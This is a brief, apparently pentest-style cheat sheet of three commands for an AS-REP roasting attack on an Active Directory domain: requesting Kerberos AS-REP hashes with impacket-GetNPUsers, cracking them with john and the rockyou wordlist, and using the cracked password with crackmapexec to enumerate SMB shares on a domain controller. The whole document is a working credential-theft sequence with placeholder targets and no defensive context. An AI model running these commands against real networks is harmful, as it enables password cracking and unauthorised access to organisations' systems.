# 1. Get AS-REP hashes
impacket-GetNPUsers domain.local/ -usersfile users.txt -request

# 2. Crack
john --format=krb5asrep --wordlist=rockyou.txt asrep_hashes.txt

# 3. Use credentials
crackmapexec smb $DC -u user -p cracked_pass --shares